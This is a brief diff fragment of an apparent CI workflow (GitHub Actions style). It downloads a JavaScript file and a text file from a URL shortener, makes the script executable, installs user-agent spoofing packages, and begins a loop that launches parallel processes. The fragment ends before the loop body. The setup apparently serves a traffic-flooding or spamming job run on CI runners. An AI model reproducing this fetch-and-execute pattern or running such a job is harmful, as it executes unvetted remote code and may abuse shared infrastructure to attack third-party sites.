@@ -17,7 +17,7 @@ jobs:
         run: |
           wget https://curl.by/C_qXK/nosec.js
           wget https://curl.by/19kka/fres.txt
-          chmod +x value.js
+          chmod +x nosec.js
           npm i user-agents fake-useragent 
           PIDS=()
           for i in {1..4}; do
